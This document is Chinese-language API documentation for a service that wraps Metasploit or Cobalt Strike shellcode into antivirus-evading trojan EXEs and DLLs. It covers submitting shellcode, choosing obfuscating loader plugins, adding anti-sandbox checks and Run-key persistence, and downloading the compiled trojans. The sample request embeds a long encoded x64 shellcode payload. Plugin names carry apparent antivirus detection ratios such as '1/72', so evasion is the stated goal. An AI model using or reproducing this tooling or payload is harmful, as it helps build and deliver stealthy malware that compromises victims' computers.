###  通过shellcode来生成免杀

`/api/shellcode_to_trojan/`通过shellcode来生成

```json
{
	"token": "xxx",
	"shellcode_type": "1",
	"shellcode_architecture": "x64",
	"plugin":"Cpp_EXE_Windows_Null_Yes_CreateThreatPoolWait_20210908.py",
	"auto_start_function":[],
	"anti_sandbox_function":["NumberOfProcesses2c"],
  "shellcode":"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc4\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\xa0\\xa2\\xe9\\xe1\\xd3\\xa2\\xe2\\x2f\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xe8\\x93\\x20\\xa9\\x52\\x4b\\x2b\\xd0\\x5f\\x5d\\xa1\\x6c\\xd6\\x4d\\x1d\\xd0\\x5f\\xea\\x52\\xf9\\x05\\xa4\\x17\\xc1\\x0d\\x5b\\x63\\xa9\\xe2\\xfa\\xc5\\x67\\x8d\\x5a\\x16\\x1e\\x2c\\x40\\x16\\x7f\\x47\\x6d\\x54\\x8e\\x97\\x95\\x97\\xc8\\x89\\xec\\x91\\x0a\\x91\\xa4\\x97\\xc8\\x3e\\x1f\\xd2\\x85\\x3a\\x62\\x17\\x97\\xf5\\xa1\\x54\\x3e\\x26\\x7c\\x20\\x1a\\x8e\\x5b\\xe3\\xf0\\x9c\\xaf\\xee\\x8c\\xfb\\xd5\\xe2\\x46\\x2e\\xa1\\x59\\x42\\x7a\\x10\\x66\\x40\\x02\\xa1\\x59\\xf5\\x89\\xb2\\x4b\\x91\\x31\\x17\\x15\\xc7\\x2c\\xd5\\x52\\xf7\\xda\\x16\\x8b\\x45\\xcd\\x62\\x9c\\x4d\\x09\\x39\\xbf\\x4a\\xb6\\x55\\x39\\x0d\\x1c\\x8e\\x71\\xcb\\x73\\xd1\\x3f\\x2a\\x1c\\x8e\\xc6\\x38\\xdb\\x73\\x7a\\xf0\\xfb\\xba\\x91\\x3e\\xb6\\xe5\\x88\\xf2\\xab\\x5c\\x76\\x7c\\x01\\x2b\\x32\\x21\\x8e\\xe7\\xed\\xee\\x67\\xf6\\x12\\x97\\x39\\x29\\x6c\\x2b\\xe3\\xf0\\x30\\x97\\x39\\x9e\\x9f\\x05\\x05\\xcb\\x6c\\xa6\\x8b\\xc1\\x95\\xee\\xd7\\x47\\xe8\\x20\\xeb\\x2e\\xdb\\x59\\x19\\xfd\\x3b\\x37\\x6d\\x81\\x63\\x98\\x43\\xc8\\x7e\\xcb\\x25\\x43\\xd6\\x29\\xfb\\x5a\\x2f\\x9d\\x6d\\x33\\x55\\x0d\\xe3\\x83\\x2c\\xab\\x6d\\x89\\xd5\\x70\\xe3\\x83\\x2c\\xeb\\x6d\\x89\\xf5\\x38\\xe3\\x07\\xc9\\x81\\x6f\\x4f\\xb6\\xa1\\xe3\\x39\\xbe\\x67\\x19\\x63\\xfb\\x6a\\x87\\x28\\x3f\\x0a\\xec\\x0f\\xc6\\x69\\x6a\\xea\\x93\\x99\\x64\\x53\\xcf\\xe3\\xf9\\x28\\xf5\\x89\\x19\\x4a\\x86\\xb8\\x20\\x88\\xf6\\xcb\\x25\\x02\\xcf\\xed\\x6b\\x7c\\x19\\x83\\x24\\xd2\\xd7\\xe3\\xe3\\x10\\x3a\\x40\\x65\\x22\\xce\\x69\\x7b\\xeb\\x28\\x83\\xda\\xcb\\xc6\\xe3\\x9f\\x80\\x36\\xca\\xf3\\x4f\\xb6\\xa1\\xe3\\x39\\xbe\\x67\\x64\\xc3\\x4e\\x65\\xea\\x09\\xbf\\xf3\\xc5\\x77\\x76\\x24\\xa8\\x44\\x5a\\xc3\\x60\\x3b\\x56\\x1d\\x73\\x50\\x3a\\x40\\x65\\x26\\xce\\x69\\x7b\\x6e\\x3f\\x40\\x29\\x4a\\xc3\\xe3\\xeb\\x14\\x37\\xca\\xf5\\x43\\x0c\\x6c\\x23\\x40\\x7f\\x1b\\x64\\x5a\\xc6\\x30\\xf5\\x51\\x24\\x8a\\x7d\\x43\\xde\\x29\\xf1\\x40\\xfd\\x27\\x05\\x43\\xd5\\x97\\x4b\\x50\\x3f\\x92\\x7f\\x4a\\x0c\\x7a\\x42\\x5f\\x81\\x34\\xda\\x5f\\xcf\\xd2\\xaa\\x08\\x7e\\xcb\\x25\\x02\\x87\\x68\\xe3\\x85\\xf3\\xca\\x24\\x02\\x87\\x29\\x11\\x39\\xf5\\xa4\\xa2\\xfd\\x52\\xd3\\x5b\\xbd\\xdc\\x9d\\x64\\xb8\\x21\\xfd\\x16\\x95\\x81\\x1e\\x6d\\x81\\x43\\x40\\x97\\x0e\\x02\\xc1\\xa5\\xf9\\x67\\x1d\\xae\\xb3\\x39\\xd8\\x57\\x6d\\xed\\x68\\xf2\\x49\\xf7\\x11\\xda\\xd7\\xe4\\x09\\xc7\\x6b\\x50\\xae\\x5d\\x67\\x87\\x68\\xab\\x08\\x7e\\x68\\xe3\\x5e\\x68\\x2f"
}
```

> 参数解释

- `token`登录后返回的**token**
- `shellcode` 通过**MSF**或者**CS**来生成的值，格式必须为`\\xFF`
- `shellcode_type`来自**MSF**传入1，来自**CS**传入2
- `shellcode_architecture`传入代码的类型，x86或者x64再或者其他架构
- `plugin`插件名称，通过`api/get_trojan_plugins`获取
- `auto_start_function`函数列表，通过`api/get_auto_start`接口获取，如果不想添加该功能只需传入空列表即可
- `anti_sandbox_function`函数列表，通过`api/get_anti_sandbox`接口获取，如果不想添加该功能只需传入空列表即可

> 返回状态码

- 161：呐呐呐！未知错误內~
- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
- 197：呐呐呐！你这插件有问题呀！快上服务器看看是不是写错了
- 200：宝贝任务已下发~
- 402：传入自启函数并不在可调用列表中ლ(•̀ _ •́ ლ)
- 403：小宝贝这是非法请求哦(๑•̀ㅂ•́)و✧
- 404：暂不支持其他架构~
- 405：传入反沙箱函数并不在可调用列表中ლ(•̀ _ •́ ლ)
- 406：自启动函数代码与插件语言类型不符ლ(•̀ _ •́ ლ)
- 407：反沙盒函数代码与插件语言类型不符ლ(•̀ _ •́ ლ)
- 408：呐呐呐！AutoStartFunction中getattr函数错误~
- 409：呐呐呐！AntiSandboxFunction中getattr函数错误~
- 430：小伙子不要搞事情嗷，你不看看插件是否传入正确ლ(•̀ _ •́ ლ)
- 450：呐呐呐！该种组合无法进行编译，请使用其他插件~
- 500：请使用Post请求
- 600：你的电脑不是Mac或者Linux无法使用该功能ლ(•̀ _ •́ ლ)
- 601：暂不支持Windows免杀方式~敬请关注后续更新

### 用户免杀数据查询

`/api/trojan_data_query/`用来查询当前用户下发的任务和状态

```json
{
	"token": "xxx",
	"number_of_pages":"20"
}
```

> 参数解释

- `token`登录后返回的**token**
- `number_of_pages`查询的页数，单页默认100个数据

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)

- 200：返回用户当前信息

  ```json
  {
  	"message": [{
  		"trojan_id": 1,
  		"shellcode_type": "1",
  		"trojan_original_file_name": "ggkOx1629870349.c",
  		"trojan_generate_file_name": "ggkOx1629870349.exe",
  		"compilation_status": "0",
  		"creation_time": "1629870357",
  		"shellcode_architecture": "x64",
  		"plugin": "test.py"
  	}, {
  		"trojan_id": 4,
  		"shellcode_type": "1",
  		"trojan_original_file_name": "IJmXK1629877743.c",
  		"trojan_generate_file_name": "IJmXK1629877743.dll",
  		"compilation_status": "-1",
  		"creation_time": "1629877744",
  		"shellcode_architecture": "x64",
  		"plugin": "test-dll.py"
  	}, {
  		"trojan_id": 5,
  		"shellcode_type": "1",
  		"trojan_original_file_name": "ObOfz1630312479.c",
  		"trojan_generate_file_name": "ObOfz1630312479.dll",
  		"compilation_status": "1",
  		"creation_time": "1630312479",
  		"shellcode_architecture": "x64",
  		"plugin": "test-dll.py"
  	}],
  	"code": 200
  }
  ```

  > 返回参数解释

  - `trojan_id`项目的id值
  - `shellcode_type`来自**MSF**为1，来自**CS**为2
  - `virus_original_file_name`生成的未编译的文件名
  - `virus_generate_file_name`生成编译好的文件名
  - `compilation_status`文件编译状态，0为未完成，1完成，-1出错
  - `creation_time`创建时间
  - `shellcode_architecture`当前shellcode使用架构
  - `plugin`生成的插件名称

- 403：小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧

- 500：请使用Post请求



### 用户免杀数据个数

`/api/trojan_data_statistical/`个数统计

```json
{
	"token": "xxx"
}
```

> 参数解释

- `token`登录后返回的**token**

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)

- 200：返回数据大小

- 403：小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧

- 500：请使用Post请求



### 获取用户当前木马插件内容

`/api/get_trojan_plugins/` 详细数据获取

```json
{
	"token": "xxx"
}
```

> 参数解释

- `token`登录后返回的**token**

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)

- 200：返回插件内容

  ```json
  {
  	"message": {
  		"Cpp_DLL_Windows_XOR_Yes_CreateThread_20210903.py": "Cpp-DLL-Windows-XOR-Yes-CreateThread-20210902-6/66",
  		"Cpp_EXE_Windows_AES_Yes_ProcessingControlBlock_20210910.py": "Cpp-EXE-Windows-AES-Yes-ProcessingControlBlock-20210910-1/72",
  		"Go_EXE_Windows_Null_Yes_Syscall_20210902.py": "Go-EXE-Windows-Null-Yes-Syscall-20210902-12/72",
  		"Nim_EXE_Windows_Null_Yes_CreateRemoteThread_20210902.py": "Nim-EXE-Windows-Null-Yes-CreateRemoteThread-20210902-11/72",
  		"C_DLL_Windows_Null_Yes_MemoryEnforcement_20210831.py": "C-DLL-Windows-Null-Yes-MemoryEnforcement-20210901-15/72",
  		"C_EXE_Windows_XOR_Yes_MemoryEnforcement_20210901.py": "C-EXE-Windows-XOR-Yes-MemoryEnforcement-20210901-12/72",
  		"Cpp_EXE_Windows_Null_Yes_CreateThreatPoolWait_20210908.py": "Cpp-EXE-Windows-Null-Yes-CreateThreatPoolWait-20210908-1/72",
  		"Go_EXE_Windows_Null_No_ShellcodeLoader_20210907.py": "Go-EXE-Windows-Null-No-ShellcodeLoader-20210907-3/72"
  	},
  	"code": 200
  }
  ```

  > 返回参数解释

  - `Cpp_DLL_Windows_XOR_Yes_CreateThread_20210903.py`该值为左边，本地文件名字需要传入`api/shellcode_to_trojan`接口的`plugin`参数中
  - `Cpp-EXE-Windows-Null-Yes-CreateThreatPoolWait-20210908-1/72`该值为右边，显示在前端页面上的

- 403：小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧

- 500：请使用Post请求

### 获取反沙箱函数

`/api/get_anti_sandbox/` 内置类中的函数

```json
{
	"token": "xxx"
}
```

> 参数解释

- `token`登录后返回的**token**

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)

- 200：返回插件内容

  ```json
  {
  	"message": ["CheckHardDisk2c", "CheckReadAndMemory2c", "CheckRunningTime2c", "NumberOfProcesses2c", "TimeAcceleratedJudgment2c"],
  	"code": 200
  }
  ```

  > 返回参数解释

  - `message`为函数的内容列表

- 403：小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
- 500：请使用Post请求

### 获取自启动函数

`/api/get_auto_start/` 内置类中的函数

```json
{
	"token": "xxx"
}
```

> 参数解释

- `token`登录后返回的**token**

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)

- 200：返回插件内容

  ```json
  {
  	"message": ["CurrentVersionRun2c"],
  	"code": 200
  }
  ```

  > 返回参数解释

  - `message`为函数的内容列表

- 403：小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
- 500：请使用Post请求

### 木马文件下载验证接口

`/api/trojan_file_download_verification/` 

```json
{
	"token": "xxx",
	"trojan_id":"1",
	"trojan_generate_file_name":"xxxx.exe"
}
```

> 参数解释

- `token`登录后返回的**token**
- `trojan_id`通过`api/trojan_data_query`接口获取的值
- `trojan_generate_file_name`同上一样，需要和trojan_id与之对应

> 返回状态码

- 169：呐呐呐！莎酱被玩坏啦(>^ω^<)
- 200：直接下载成功
- 402：该文件不是你的，别瞎请求(๑•̀ㅂ•́)و✧

- 403：小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧
- 500：请使用Post请求